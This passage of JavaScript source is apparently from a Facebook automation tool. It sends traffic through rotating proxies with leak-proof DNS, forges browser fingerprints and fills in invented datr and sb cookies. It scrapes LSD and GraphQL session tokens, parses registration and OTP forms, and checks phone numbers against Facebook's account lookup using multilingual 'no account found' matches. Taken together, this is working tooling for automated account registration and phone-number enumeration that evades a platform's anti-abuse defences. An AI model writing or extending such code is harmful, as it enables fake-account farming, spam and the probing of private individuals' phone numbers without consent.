    if (normalized && !seen.has(normalized)) {
      seen.add(normalized);
      out.push(normalized);
    }
  }
  return out;
}

function readGlobalProxies() {
  try {
    if (!fs.existsSync(FILES.proxies)) return [];
    return parseProxyLines(fs.readFileSync(FILES.proxies, 'utf-8'));
  } catch {
    return [];
  }
}

function writeGlobalProxies(list) {
  const unique = Array.from(new Set(list.map((x) => validateProxyUrl(x) || '').filter(Boolean)));
  fs.writeFileSync(FILES.proxies, unique.join('\n') + (unique.length ? '\n' : ''), 'utf-8');
}

function mergeRequestHeaders(baseHeaders, overrideHeaders) {
  const merged = {};
  const keyMap = {};
  const putAll = (src) => {
    for (const [k, v] of Object.entries(src || {})) {
      if (v === undefined || v === null || /[\r\n]/.test(k) || /[\r\n]/.test(String(v))) continue;
      const low = k.toLowerCase();
      if (low === 'accept-encoding') continue; // handled safely by curl --compressed / fetch
      if (keyMap[low]) delete merged[keyMap[low]];
      keyMap[low] = k;
      merged[k] = String(v);
    }
  };
  putAll(baseHeaders);
  putAll(overrideHeaders);
  return merged;
}

const proxyTrafficStats = {
  requests: 0,
  txBytes: 0,
  rxBytes: 0,
  savedWarmups: 0,
};

function formatBytes(bytes) {
  const b = Math.max(0, Number(bytes) || 0);
  if (b < 1024) return `${Math.round(b)} B`;
  if (b < 1024 * 1024) return `${(b / 1024).toFixed(1)} KB`;
  if (b < 1024 * 1024 * 1024) return `${(b / (1024 * 1024)).toFixed(2)} MB`;
  return `${(b / (1024 * 1024 * 1024)).toFixed(2)} GB`;
}

async function fetchViaProxyCurl(url, jar, opts = {}, proxyUrl = null) {
  const method = opts.method || 'GET';
  const timeoutSec = Math.max(4, Math.ceil((opts.timeoutMs || 25000) / 1000));
  const cookieStr = formatCookieHeader(jar);
  const marker = '__FBTOOLS_META__';

  let proxyEndpoint = null;
  let proxyAuth = null;
  if (proxyUrl) {
    const parsedPx = new URL(proxyUrl);
    // Use remote DNS resolution for SOCKS proxies so VPS DNS never leaks
    const curlProto =
      parsedPx.protocol === 'socks5:'
        ? 'socks5h:'
        : parsedPx.protocol === 'socks4:'
        ? 'socks4a:'
        : parsedPx.protocol;
    proxyEndpoint = `${curlProto}//${parsedPx.hostname}${parsedPx.port ? ':' + parsedPx.port : ''}`;
    if (parsedPx.username || parsedPx.password) {
      proxyAuth = `${decodeURIComponent(parsedPx.username)}:${decodeURIComponent(parsedPx.password)}`;
    }
  }

  const defaultHdrs = {
    'User-Agent': opts.ua || opts.headers?.['User-Agent'] || LITE_UA,
    'Accept-Language': 'en-US,en;q=0.9',
    Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  };
  const hdrs = mergeRequestHeaders(defaultHdrs, opts.headers);
  if (cookieStr) hdrs.Cookie = cookieStr;

  const args = [
    '-sS',
    '-L',
    '--http2',
    '--compressed',
    '--max-redirs',
    '6',
    '--connect-timeout',
    String(Math.min(6, timeoutSec)),
    '--max-time',
    String(timeoutSec),
    ...(proxyEndpoint ? ['--no-keepalive', '--max-filesize', String(opts.maxFilesize || 1572864)] : []),
    ...(opts.headOnly ? ['-I'] : []),
    '-i',
    ...(proxyEndpoint ? ['-x', proxyEndpoint] : []),
    ...(proxyAuth ? ['--proxy-user', proxyAuth] : []),
    '-X',
    method,
  ];

  for (const [k, v] of Object.entries(hdrs)) {
    args.push('-H', `${k}: ${v}`);
  }
  if (opts.body !== undefined) {
    args.push('--data-raw', opts.body);
  }
  args.push('-w', `\n${marker}%{http_code}|%{url_effective}|%{size_download}`);
  args.push(url);

  const rawOut = await new Promise((resolve, reject) => {
    const child = spawn('curl', args, { shell: false });
    const chunks = [];
    const errChunks = [];
    let aborted = false;
    const abortCheck = opts.shouldAbort
      ? setInterval(() => {
          if (opts.shouldAbort()) {
            aborted = true;
            try { child.kill('SIGKILL'); } catch { /* ignore */ }
          }
        }, 250)
      : null;
    child.stdout.on('data', (c) => chunks.push(c));
    child.stderr.on('data', (c) => errChunks.push(c));
    child.on('error', (err) => {
      if (abortCheck) clearInterval(abortCheck);
      reject(err);
    });
    child.on('close', (code) => {
      if (abortCheck) clearInterval(abortCheck);
      if (aborted) {
        reject(new Error('Aborted by user'));
      } else if (code !== 0 && chunks.length === 0) {
        reject(new Error(Buffer.concat(errChunks).toString('utf-8').trim() || `curl exited ${code}`));
      } else {
        resolve(Buffer.concat(chunks).toString('utf-8'));
      }
    });
  });

  const idx = rawOut.lastIndexOf(`\n${marker}`);
  const metaPart = idx >= 0 ? rawOut.slice(idx + marker.length + 1).trim() : '';
  const payload = idx >= 0 ? rawOut.slice(0, idx) : rawOut;
  const [statusStr, effUrl, dlSizeStr] = metaPart.split('|');
  const status = Number(statusStr) || 200;

  if (proxyEndpoint) {
    const hdrBytes = Object.entries(hdrs).reduce((acc, [k, v]) => acc + k.length + String(v).length + 4, 96);
    const bodyBytes = opts.body ? Buffer.byteLength(String(opts.body)) : 0;
    const dlBytes = Number(dlSizeStr) || Buffer.byteLength(payload || '');
    proxyTrafficStats.requests += 1;
    proxyTrafficStats.txBytes += hdrBytes + bodyBytes;
    proxyTrafficStats.rxBytes += dlBytes;
  }

  let rest = payload;
  while (rest.startsWith('HTTP/')) {
    const sepCrLf = rest.indexOf('\r\n\r\n');
    const sepLf = rest.indexOf('\n\n');
    let cut = -1;
    let step = 0;
    if (sepCrLf >= 0 && (sepLf < 0 || sepCrLf < sepLf)) {
      cut = sepCrLf;
      step = 4;
    } else if (sepLf >= 0) {
      cut = sepLf;
      step = 2;
    }
    if (cut < 0) break;
    const hdrBlock = rest.slice(0, cut);
    for (const line of hdrBlock.split(/\r?\n/)) {
      if (line.toLowerCase().startsWith('set-cookie:')) {
        const cookieVal = line.slice('set-cookie:'.length).trim();
        const first = cookieVal.split(';', 1)[0] || '';
        const eq = first.indexOf('=');
        if (eq > 0) {
          const k = first.slice(0, eq).trim();
          const v = first.slice(eq + 1).trim();
          if (k && v !== 'deleted') jar[k] = v;
          else if (k && v === 'deleted') delete jar[k];
        }
      }
    }
    rest = rest.slice(cut + step);
    while (/^[\r\n]+HTTP\//.test(rest)) {
      rest = rest.replace(/^[\r\n]+/, '');
    }
  }

  return { status, url: effUrl || url, text: rest };
}

function mergeSetCookies(jar, headers) {
  const rawList = typeof headers.getSetCookie === 'function' ? headers.getSetCookie() : [];
  if (rawList.length === 0) {
    const single = headers.get('set-cookie');
    if (single) rawList.push(single);
  }
  for (const line of rawList) {
    const first = line.split(';', 1)[0];
    const eq = first.indexOf('=');
    if (eq > 0) {
      const k = first.slice(0, eq).trim();
      const v = first.slice(eq + 1).trim();
      if (k && v !== 'deleted') jar[k] = v;
      else if (k && v === 'deleted') delete jar[k];
    }
  }
}

async function fetchWithJar(url, jar, opts = {}) {
  const validProxy = validateProxyUrl(opts.proxy);
  const t0 = Date.now();
  if (validProxy) {
    try {
      const res = await fetchViaProxyCurl(url, jar, opts, validProxy);
      if (res.status === 407) {
        const authErr = new Error('Proxy auth required (HTTP 407)');
        authErr.isProxyError = true;
        authErr.proxyUrl = validProxy;
        recordProxyHealth(validProxy, false, Date.now() - t0, { err: 'HTTP 407' });
        throw authErr;
      }
      recordProxyHealth(validProxy, res.status < 500, Date.now() - t0);
      return res;
    } catch (err) {
      const reason = err instanceof Error ? err.message : 'proxy error';
      recordProxyHealth(validProxy, false, Date.now() - t0, { err: reason });
      if (opts.strictProxy !== false) {
        const pxErr = new Error(`Proxy failed (${reason})`);
        pxErr.isProxyError = true;
        pxErr.proxyUrl = validProxy;
        throw pxErr;
      }
      appendDebugLog(`proxy failed (${reason}), direct fallback`);
    }
  }

  if (opts.preferCurl) {
    return await fetchViaProxyCurl(url, jar, opts, null);
  }

  let currentUrl = url;
  const maxRedirects = 6;
  const timeoutMs = opts.timeoutMs || 25000;
  let method = opts.method || 'GET';
  let body = opts.body;

  for (let hop = 0; hop <= maxRedirects; hop++) {
    const cookieStr = formatCookieHeader(jar);
    const baseHdrs = {
      'User-Agent': opts.ua || opts.headers?.['User-Agent'] || LITE_UA,
      'Accept-Language': 'en-US,en;q=0.9',
      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    };
    const finalHdrs = mergeRequestHeaders(baseHdrs, opts.headers);
    if (cookieStr) finalHdrs.Cookie = cookieStr;

    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);
    try {
      const res = await fetch(currentUrl, {
        method,
        headers: finalHdrs,
        body,
        redirect: 'manual',
        signal: controller.signal,
      });
      clearTimeout(timer);
      mergeSetCookies(jar, res.headers);

      if (res.status >= 300 && res.status < 400) {
        const loc = res.headers.get('location');
        if (loc) {
          currentUrl = new URL(loc, currentUrl).toString();
          if (res.status === 301 || res.status === 302 || res.status === 303) {
            method = 'GET';
            body = undefined;
          }
          continue;
        }
      }
      const text = await res.text();
      return { status: res.status, url: currentUrl, text };
    } catch (err) {
      clearTimeout(timer);
      throw err;
    }
  }
  throw new Error('Too many redirects');
}

async function testProxyTcp(target, checkExitIp = true, opts = {}) {
  const t0 = Date.now();
  const valid = validateProxyUrl(target);
  if (!valid) {
    return { proxy: target, ok: false, latencyMs: 0, error: 'Invalid proxy format' };
  }
  try {
    const parsed = new URL(valid);
    const port = Number(parsed.port || (parsed.protocol === 'https:' ? 443 : 80));
    await new Promise((resolve, reject) => {
      const s = net.createConnection({ host: parsed.hostname, port, timeout: 2200 }, () => {
        s.destroy();
        resolve();
      });
      s.on('error', (e) => {
        s.destroy();
        reject(e);
      });
      s.on('timeout', () => {
        s.destroy();
        reject(new Error('TCP timeout'));
      });
    });

    const fp = buildFingerprint('');
    const probeJar = {};
    const fbPromise = fetchViaProxyCurl(
      `${FB_REG_BASE}/reg/?cid=103&refsrc=deprecated&soft=hjk`,
      probeJar,
      { timeoutMs: 8000, ua: fp.ua, headers: fp.headers, headOnly: Boolean(opts.lite) },
      valid
    );
    const ipPromise = checkExitIp
      ? fetchViaProxyCurl('https://ip-info.9proxy.com', {}, { timeoutMs: 4500, ua: fp.ua }, valid)
          .then(async (r) => {
            try {
              const j = JSON.parse(r.text || '{}');
              if (j.ip) return { ip: j.ip, iso: j.iso2 || '', country: j.country || '', city: j.city || '', isp: j.isp || '' };
            } catch {
              // fallback
            }
            const r2 = await fetchViaProxyCurl('https://api.ipify.org?format=json', {}, { timeoutMs: 3000, ua: fp.ua }, valid);
            try {
              const j2 = JSON.parse(r2.text || '{}');
              return { ip: j2.ip || '', iso: '', country: '', city: '', isp: '' };
            } catch {
              return { ip: '', iso: '', country: '', city: '', isp: '' };
            }
          })
          .catch(() => ({ ip: '', iso: '', country: '', city: '', isp: '' }))
      : Promise.resolve({ ip: '', iso: '', country: '', city: '', isp: '' });

    const [probeRes, geoInfo] = await Promise.all([fbPromise, ipPromise]);
    const exitIp = geoInfo?.ip || '';
    const latencyMs = Date.now() - t0;
    const body = probeRes.text || '';
    const hasLsd = !opts.lite && Boolean(
      body.match(/"LSD",\[\],\{"token":"([^"]+)"/) || body.match(/name="lsd"[^>]*value="([^"]+)"/i)
    );
    if (probeRes.status >= 400) {
      recordProxyHealth(valid, false, latencyMs, { err: `HTTP ${probeRes.status}` });
      return { proxy: valid, ok: false, latencyMs, exitIp, geoInfo, hasLsd: false, error: `HTTP ${probeRes.status}` };
    }
    recordProxyHealth(valid, true, latencyMs, { exitIp });
    return { proxy: valid, ok: true, latencyMs, exitIp, geoInfo, hasLsd };
  } catch (err) {
    const latencyMs = Date.now() - t0;
    const msg = err instanceof Error ? err.message : 'unreachable';
    recordProxyHealth(valid, false, latencyMs, { err: msg });
    return { proxy: valid, ok: false, latencyMs, error: msg };
  }
}

// ----------------------------------------------------------------------------
// 4. Number Normalization, Cookie & HTML / JSONStream Form Parsing
// ----------------------------------------------------------------------------
function detectCountryFromNumber(raw, fallbackCc = '880', countryHintName = '') {
  const rawTrim = String(raw || '').trim();
  const explicitIntl = rawTrim.startsWith('+');
  let d = rawTrim.replace(/\D/g, '');
  if (!d) return null;
  let hadZeroZero = false;
  if (d.startsWith('00')) {
    d = d.slice(2);
    hadZeroZero = true;
  }
  if (!d || d.length > 15) return null;

  const hintIso = countryNameToIso(countryHintName);
  const fbCc = String(fallbackCc || '880').replace(/\D/g, '') || '880';
  const [fbNat, fbTrunk] = CC_INFO[fbCc] || [0, '0'];

  // Special case: Kazakhstan (+76 / +77) vs Russia (+7)
  if ((d.startsWith('76') || d.startsWith('77')) && d.length === 11 && (explicitIntl || hadZeroZero || fbCc !== '7')) {
    return { normalized: d, cc: '7', name: 'Kazakhstan', iso: 'KZ' };
  }

  // Local number with leading trunk 0 (not explicit + or 00) -> use fallback CC
  if (!explicitIntl && !hadZeroZero && d.startsWith('0')) {
    const stripped = fbTrunk && d.startsWith(fbTrunk) ? d.slice(fbTrunk.length) : d.replace(/^0+/, '');
    const full = fbCc + stripped;
    if (fbNat && full.length < fbCc.length + fbNat - 2) return null;
    if (full.length > 15 || full.length < 8) return null;
    const [name, iso] = COUNTRY_MAP[fbCc] || [countryHintName || 'Unknown', hintIso || '??'];
    return { normalized: full, cc: fbCc, name, iso: iso !== '??' ? iso : (hintIso || '??') };
  }

  // If digits look like an exact local number for fallbackCc (without CC prefix), treat as local fallbackCc
  if (!explicitIntl && !hadZeroZero && fbNat > 0 && d.length === fbNat && !d.startsWith(fbCc)) {
    const full = fbCc + d;
    if (full.length <= 15) {
      const [name, iso] = COUNTRY_MAP[fbCc] || [countryHintName || 'Unknown', hintIso || '??'];
      return { normalized: full, cc: fbCc, name, iso: iso !== '??' ? iso : (hintIso || '??') };
    }
  }

  // Auto-detect international country prefix (longest match 3 -> 2 -> 1)
  for (const len of [3, 2, 1]) {
    const prefix = d.slice(0, len);
    const mapped = COUNTRY_MAP[prefix];
    if (!mapped) continue;
    const info = CC_INFO[prefix];
    if (info && info[0] > 0) {
      const minLen = prefix.length + info[0] - (explicitIntl || hadZeroZero ? 2 : 1);
      const maxLen = prefix.length + info[0] + 2;
      if (d.length >= minLen && d.length <= Math.min(15, maxLen)) {
        return { normalized: d, cc: prefix, name: mapped[0], iso: mapped[1] };
      }
    } else if (d.length >= prefix.length + 7 && d.length <= 15) {
      if (len >= 2 || explicitIntl || hadZeroZero) {
        return { normalized: d, cc: prefix, name: mapped[0], iso: mapped[1] };
      }
    }
  }

  // Fallback to countryHintName if explicit international number has unmapped dial prefix
  if ((explicitIntl || hadZeroZero) && hintIso) {
    return { normalized: d, cc: d.slice(0, 3), name: countryHintName || hintIso, iso: hintIso };
  }

  // Fallback to default CC
  let out = d;
  if (!out.startsWith(fbCc)) {
    if (fbTrunk && out.startsWith(fbTrunk)) out = out.slice(fbTrunk.length);
    out = fbCc + out;
  }
  if (fbNat && out.length < fbCc.length + fbNat - 2) return null;
  if (out.length > 15 || out.length < 8) return null;
  const [name, iso] = COUNTRY_MAP[fbCc] || [countryHintName || 'Unknown', hintIso || '??'];
  return { normalized: out, cc: fbCc, name, iso: iso !== '??' ? iso : (hintIso || '??') };
}

function normNumber(raw, cc) {
  const det = detectCountryFromNumber(raw, cc);
  return det ? det.normalized : '';
}

function numberVariants(num, cc) {
  const d = (num || '').replace(/\D/g, '');
  if (!d) return [''];
  const det = detectCountryFromNumber(`+${d}`, cc);
  const effCc = det?.cc || String(cc || '').replace(/\D/g, '');
  const out = [d, '+' + d, '00' + d];
  const [, trunk] = CC_INFO[effCc] || [0, '0'];
  if (effCc && d.startsWith(effCc) && d.length > effCc.length + 5) {
    out.push((trunk || '') + d.slice(effCc.length));
  }
  return Array.from(new Set(out));
}

function parseCookieHeader(raw) {
  const out = {};
  for (const part of (raw || '').replace(/\n/g, ';').split(';')) {
    const idx = part.indexOf('=');
    if (idx > 0) {
      const k = part.slice(0, idx).trim();
      const v = part.slice(idx + 1).trim();
      if (k) out[k] = v;
    }
  }
  return out;
}

function normalizeBaseCookiesRaw(raw) {
  const parts = (raw || '')
    .replace(/\r?\n/g, ';')
    .split(';')
    .map((p) => p.trim())
    .filter((p) => p.includes('='));
  const keys = new Set(parts.map((p) => p.split('=', 1)[0].trim()));
  if (!keys.has('sb')) parts.push(`sb=${freshSb()}`);
  if (!keys.has('datr')) parts.push(`datr=${randTok(12)}`);
  if (!keys.has('wd')) parts.push('wd=360x800');
  if (!keys.has('m_pixel_ratio')) parts.push('m_pixel_ratio=2');
  return parts.join('; ');
}

function readForm(html, prefer = 'reg') {
  const forms = html.match(/<form[^>]*>[\s\S]*?<\/form>/gi) || [];
  let blk = html || '';
  if (forms.length > 0) {
    forms.sort((a, b) => {
      if (prefer === 'otp') {
        const al = a.toLowerCase();
        const bl = b.toLowerCase();
        const aHasOtp = OTP_FIELDS.some((k) => al.includes(`name="${k}"`) || al.includes(`name='${k}'`));
        const bHasOtp = OTP_FIELDS.some((k) => bl.includes(`name="${k}"`) || bl.includes(`name='${k}'`));
        if (aHasOtp !== bHasOtp) return aHasOtp ? -1 : 1;
        const aHasConfirm = al.includes('confirm') || al.includes('checkpoint');
        const bHasConfirm = bl.includes('confirm') || bl.includes('checkpoint');
        if (aHasConfirm !== bHasConfirm) return aHasConfirm ? -1 : 1;
        return b.length - a.length;
      }
      const aReg = a.includes('reg_email__');
      const bReg = b.includes('reg_email__');
      if (aReg !== bReg) return aReg ? -1 : 1;
      return b.length - a.length;
    });
    blk = forms[0] ?? '';
  }

  const actMatch = blk.match(/action=["']([^"']+)["']/i);
  const action = (actMatch ? actMatch[1] : '').replace(/&amp;/g, '&');
  const inputs = {};
  const selects = {};

  let submitChosen = false;
  const inputTags = blk.match(/<input[^>]*>/gi) || [];
  for (const tag of inputTags) {
    const nMatch = tag.match(/name=["']([^"']+)["']/i);
    if (!nMatch) continue;
    const name = nMatch[1];
    const tMatch = tag.match(/type=["']([^"']+)["']/i);
    const vMatch = tag.match(/value=["']([^"']*)["']/i);
    const itype = tMatch ? tMatch[1].toLowerCase() : 'text';
    const ival = vMatch ? vMatch[1] : '';

    if (itype === 'submit') {
      const ln = name.toLowerCase();
      const lv = ival.toLowerCase();
      if (prefer === 'otp' && ['resend', 'change', 'cancel', 'logout'].some((w) => ln.includes(w) || lv.includes(w))) {
        continue;
      }
      if (prefer === 'otp' && submitChosen) continue;
      submitChosen = true;
    }
    inputs[name] = [itype, ival];
  }

  if (prefer === 'otp' && !submitChosen) {
    const btnTags = blk.match(/<button[^>]*type=["']?submit["']?[^>]*>/gi) || [];
    for (const tag of btnTags) {
      const nMatch = tag.match(/name=["']([^"']+)["']/i);
      const vMatch = tag.match(/value=["']([^"']*)["']/i);
      if (nMatch) {
        const bname = nMatch[1];
        const bval = vMatch ? vMatch[1] : '1';
        if (!['resend', 'change', 'cancel', 'logout'].some((w) => bname.toLowerCase().includes(w) || bval.toLowerCase().includes(w))) {
          inputs[bname] = ['submit', bval];
          break;
        }
      }
    }
  }

  const selectTags = blk.match(/<select[^>]*>[\s\S]*?<\/select>/gi) || [];
  for (const sm of selectTags) {
    const nMatch = sm.match(/name=["']([^"']+)["']/i);
    if (!nMatch) continue;
    const opts = [];
    const optMatches = sm.matchAll(/<option[^>]*>([\s\S]*?)<\/option>/gi);
    for (const om of optMatches) {
      const valMatch = om[0].match(/value=["']([^"']*)["']/i);
      const txt = om[1].replace(/<[^>]+>/g, '').trim();
      opts.push([valMatch ? valMatch[1] : txt, txt]);
    }
    selects[nMatch[1]] = opts;
  }

  return { action, inputs, selects };
}

function tok(html, name) {
  if (name === 'lsd') {
    const mLsd = html.match(/"LSD",\[\],\{"token":"([^"]+)"\}/);
    if (mLsd) return mLsd[1];
  }
  const r1 = new RegExp(`name=["']${name}["'][^>]*?value=["']([^"']+)["']`, 'i');
  const r2 = new RegExp(`value=["']([^"']+)["'][^>]*?name=["']${name}["']`, 'i');
  const r3 = new RegExp(`"${name}"\\s*:\\s*"([^"]+)"`, 'i');
  const m1 = html.match(r1);
  if (m1) return m1[1];
  const m2 = html.match(r2);
  if (m2) return m2[1];
  const m3 = html.match(r3);
  if (m3) return m3[1];
  return '';
}

function fromXrefCookie(jar) {
  const raw = jar['x-referer'] || '';
  if (!raw) return { etok: '', dhash: '', cid: '' };
  try {
    const dec = decodeURIComponent(raw);
    return {
      etok: dec.match(/e_token=([A-Za-z0-9_\-]+)/)?.[1] ?? '',
      dhash: dec.match(/d_hash=([A-Za-z0-9_\-]+)/)?.[1] ?? '',
      cid: dec.match(/cid=(\d+)/)?.[1] ?? '',
    };
  } catch {
    return { etok: '', dhash: '', cid: '' };
  }
}

// ----------------------------------------------------------------------------
// 5. Facebook GraphQL Pre-Check, Limited Pringer Engine & OTP Confirmation
// ----------------------------------------------------------------------------
function decodeJsonEscapedStr(s) {
  return String(s || '')
    .replace(/\\u003C/gi, '<')
    .replace(/\\u003E/gi, '>')
    .replace(/\\u0026/gi, '&')
    .replace(/\\u0027/gi, "'")
    .replace(/\\u003D/gi, '=')
    .replace(/\\\//g, '/')
    .replace(/\\"/g, '"')
    .replace(/\\n/g, ' ')
    .replace(/\\r/g, ' ')
    .replace(/\\t/g, ' ');
}

function extractBigPipeHtmlFragments(rawText) {
  const fragments = [];
  const raw = String(rawText || '');
  // Extract __html:"..." or markup strings inside BigPipe / JSONStream responses
  for (const m of raw.matchAll(/"__html"\s*:\s*"((?:\\.|[^"\\])*)"/g)) {
    fragments.push(decodeJsonEscapedStr(m[1]));
  }
  for (const m of raw.matchAll(/"(?:errorSummary|errorDescription|error_message|reg_error)"\s*:\s*"((?:\\.|[^"\\])*)"/g)) {
    fragments.push(decodeJsonEscapedStr(m[1]));
  }
  return fragments;
}

function extractVisibleText(html) {
  const raw = String(html || '');
  const bpFragments = extractBigPipeHtmlFragments(raw).join(' ');
  const domOnly = raw
    .replace(/<script[\s\S]*?<\/script>/gi, ' ')
    .replace(/<style[\s\S]*?<\/style>/gi, ' ');
  return `${domOnly} ${bpFragments}`
    .replace(/<[^>]+>/g, ' ')
    .replace(/&nbsp;|&#160;/gi, ' ')
    .replace(/&#0*39;|&apos;/gi, "'")
    .replace(/&quot;/gi, '"')
    .replace(/&amp;/gi, '&')
    .replace(/\s+/g, ' ')
    .trim();
}

function isRealNavigationUri(uri) {
  const u = String(uri || '').trim();
  if (!u || u.length > 500) return false;
  if (/^https?:\/\/static\.xx\.fbcdn\.net/i.test(u) || /\.(?:js|css|png|jpg|webp|svg|woff2?)(?:\?|$)/i.test(u)) {
    return false;
  }
  return true;
}

function extractFbResponseSignals(rawBody) {
  const raw = String(rawBody || '');
  const chunks = parseJsonStreamObjects(raw);
  const errTexts = [];
  const redirectUris = [];
  const htmlFragments = extractBigPipeHtmlFragments(raw);

  for (const ch of chunks) collectStringsAndUris(ch, errTexts, redirectUris);

  // Extract explicit redirect / navigation calls inside BigPipe JS (goURI, redirect_uri, etc.)
  for (const m of raw.matchAll(/"(?:redirect_uri|redirectUri|redirect)"\s*:\s*"([^"]+)"/gi)) {
    const u = decodeJsonEscapedStr(m[1]).trim();
    if (isRealNavigationUri(u)) redirectUris.push(u);
  }
  for (const m of raw.matchAll(/(?:goURI|URI\.redirect)\(\s*["']([^"']+)["']/gi)) {
    const u = decodeJsonEscapedStr(m[1]).trim();
    if (isRealNavigationUri(u)) redirectUris.push(u);
  }

  // Extract visible error elements from DOM or BigPipe __html fragments
  const combinedHtml = `${raw.replace(/<script[\s\S]*?<\/script>/gi, ' ')}\n${htmlFragments.join('\n')}`;
  for (const m of combinedHtml.matchAll(/class="[^"]*(?:error|_5s6c|_585n|mfsm|uiBoxRed)[^"]*"[^>]*>([\s\S]*?)<\/div>/gi)) {
    const t = m[1].replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
    if (t.length > 4 && t.length < 280) errTexts.push(t);
  }

  // Explicit JSON errorSummary/errorDescription pairs
  for (const m of raw.matchAll(/"(?:errorSummary|errorDescription|error_message)"\s*:\s*"((?:\\.|[^"\\])*)"/g)) {
    const t = decodeJsonEscapedStr(m[1]).replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
    if (t.length > 3) errTexts.push(t);
  }

  return {
    errTexts: Array.from(new Set(errTexts)),
    redirectUris: Array.from(new Set(redirectUris.filter(isRealNavigationUri))),
    decodedHtml: combinedHtml,
    visibleText: extractVisibleText(raw),
  };
}

function parseJsonStreamObjects(rawText) {
  const objs = [];
  const raw = String(rawText || '').trim();
  if (!raw) return objs;
  for (const line of raw.split(/\r?\n/)) {
    const clean = line.trim().replace(/^for\s*\(\s*;\s*;\s*\)\s*;?/, '').trim();
    if (!clean || (clean[0] !== '{' && clean[0] !== '[')) continue;
    try {
      const parsed = JSON.parse(clean);
      if (parsed && typeof parsed === 'object') objs.push(parsed);
    } catch {
      // ignore non-json chunk
    }
  }
  if (objs.length === 0) {
    const cleanAll = raw.replace(/^for\s*\(\s*;\s*;\s*\)\s*;?/, '').trim();
    if (cleanAll.startsWith('{') || cleanAll.startsWith('[')) {
      try {
        const parsed = JSON.parse(cleanAll);
        if (parsed && typeof parsed === 'object') objs.push(parsed);
      } catch {
        // ignore
      }
    }
  }
  return objs;
}

function collectStringsAndUris(obj, errorsOut = [], urisOut = [], depth = 0) {
  if (!obj || depth > 8) return;
  if (Array.isArray(obj)) {
    for (const item of obj) collectStringsAndUris(item, errorsOut, urisOut, depth + 1);
    return;
  }
  if (typeof obj !== 'object') return;
  for (const [k, v] of Object.entries(obj)) {
    const lk = k.toLowerCase();
    if (typeof v === 'string') {
      if (
        ['errorsummary', 'errordescription', 'error_message', 'error', 'message', 'msg', 'notice'].includes(lk) &&
        v.trim().length > 3
      ) {
        errorsOut.push(decodeJsonEscapedStr(v).replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim());
      }
      if (['redirect', 'redirect_uri', 'redirecturi', 'next'].includes(lk) && v.trim()) {
        const cleanU = decodeJsonEscapedStr(v).trim();
        if (isRealNavigationUri(cleanU)) urisOut.push(cleanU);
      }
    } else if (v && typeof v === 'object') {
      collectStringsAndUris(v, errorsOut, urisOut, depth + 1);
    }
  }
}

const GQL_NO_ACCOUNT_PATTERNS = [
  'no account found',
  'hakuna akaunti',
  'aucun compte',
  'no se encontr',
  'ninguna cuenta',
  'tidak ditemukan',
  'tiada akaun',
  'account not found',
  "couldn't find your account",
  'কোনো অ্যাকাউন্ট',
  'لم يتم العثور على',
  'कोई खाता नहीं',
  'tidak ada akun',
  'nenhuma conta',
];

let gqlSessionCache = null;
let gqlHarvestInflight = null;

async function harvestGqlSessionDirect(forceRefresh = false, opts = {}) {
  const now = Date.now();
  if (!forceRefresh && gqlSessionCache && now - gqlSessionCache.fetchedAt < 8 * 60 * 1000 && gqlSessionCache.lsd) {
    return gqlSessionCache;
  }
  if (!forceRefresh && gqlHarvestInflight) {
    return gqlHarvestInflight;
  }

  gqlHarvestInflight = (async () => {
    const jar = {};
    try {
      const res = await fetchWithJar('https://www.facebook.com/login/identify/', jar, {
        preferCurl: true,
        proxy: opts.proxy || null,
        strictProxy: opts.strictProxy !== false,
        timeoutMs: opts.timeoutMs || 12000,
        ua: DESKTOP_UA,
        headers: {
          Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.9',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'none',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1',
        },
        shouldAbort: opts.shouldAbort,
      });
      const html = res.text || '';
      const lsd =
        html.match(/"LSD",\[\],\{"token":"([^"]+)"/)?.[1] ||
        html.match(/name=["']lsd["'][^>]*value=["']([^"']+)["']/i)?.[1] ||
        tok(html, 'lsd') ||
        DEFAULT_FB_LSD;
      const rev =
        html.match(/"client_revision":(\d+)/)?.[1] ||
        html.match(/"server_revision":(\d+)/)?.[1] ||
        html.match(/"__rev":(\d+)/)?.[1] ||
        '1055852612';
      const spinT = html.match(/"__spin_t":(\d+)/)?.[1] || String(Math.floor(Date.now() / 1000));
      const spinB = html.match(/"__spin_b":"([^"]+)"/)?.[1] || 'trunk';
      const hsi = html.match(/"hsi":"([^"]+)"/)?.[1] || '';

      const session = {
        lsd,
        jazoest: jazoest(lsd) || DEFAULT_GQL_JAZOEST,
        datr: jar.datr || '',
        jar,
        rev,
        spinT,
        spinB,
        hsi,
        ua: DESKTOP_UA,
        fetchedAt: Date.now(),
      };
      if (lsd && lsd !== DEFAULT_FB_LSD) {
        gqlSessionCache = session;
      }
      return session;
    } catch {
      return {
        lsd: DEFAULT_FB_LSD,
        jazoest: DEFAULT_GQL_JAZOEST,
        datr: '',
        jar: {},
        rev: '1055852612',
        spinT: String(Math.floor(Date.now() / 1000)),
        spinB: 'trunk',
        hsi: '',
        ua: DESKTOP_UA,
        fetchedAt: Date.now(),
      };
    } finally {
      gqlHarvestInflight = null;
    }
  })();

  return gqlHarvestInflight;
}

async function checkNumberGraphql(phoneNumber, opts = {}) {
  const numStr = String(phoneNumber || '').trim().startsWith('+')
    ? String(phoneNumber).trim()
    : `+${String(phoneNumber || '').replace(/\D/g, '')}`;
  const digits = numStr.replace(/\D/g, '');
  if (!digits) return { status: 'unknown', nameHint: '', reason: 'invalid phone' };

  const sess = opts.lsd
    ? {
        lsd: opts.lsd,
        jazoest: jazoest(opts.lsd) || DEFAULT_GQL_JAZOEST,
        jar: opts.jar ? { ...opts.jar } : {},
        rev: opts.rev || '1055852612',
        spinT: String(Math.floor(Date.now() / 1000)),
        spinB: 'trunk',
        hsi: opts.hsi || '',
        ua: DESKTOP_UA,
      }
    : await harvestGqlSessionDirect(Boolean(opts.forceRefreshSession), {
        timeoutMs: Math.min(opts.timeoutMs || 12000, 12000),
        shouldAbort: opts.shouldAbort,
      });

